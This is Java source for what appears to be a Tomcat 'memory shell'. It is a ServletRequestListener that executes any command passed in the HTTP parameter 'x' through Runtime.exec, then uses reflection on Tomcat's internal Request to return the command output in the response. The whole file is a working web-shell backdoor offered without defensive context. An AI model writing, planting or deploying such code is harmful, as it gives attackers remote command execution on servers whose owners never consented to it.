package com.tomcat.memshell.Listener;

import org.apache.catalina.connector.Request;

import javax.servlet.ServletRequest;
import javax.servlet.ServletRequestEvent;
import javax.servlet.ServletRequestListener;
import javax.servlet.http.HttpServletRequest;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.lang.reflect.Field;

public class TestListener implements ServletRequestListener {
    @Override
    public void requestDestroyed(ServletRequestEvent servletRequestEvent) {
        System.out.println("destroy");
        try{
            if(servletRequestEvent.getServletRequest().getParameter("x") != null){
                Process process = Runtime.getRuntime().exec(servletRequestEvent.getServletRequest().getParameter("x"));
                BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                String str = "";
                String line;
                while((line = reader.readLine()) != null) {
                    str += line;
                }
                HttpServletRequest request = (HttpServletRequest) servletRequestEvent.getServletRequest();
                Field requestfield = request.getClass().getDeclaredField("request");
                requestfield.setAccessible(true);
                Request req = (Request) requestfield.get(request);
                req.getResponse().getWriter().println(str);
            }
        }catch (Exception e){
            e.printStackTrace();
        }
    }

    @Override
    public void requestInitialized(ServletRequestEvent servletRequestEvent) {
        System.out.println("init");
    }
}
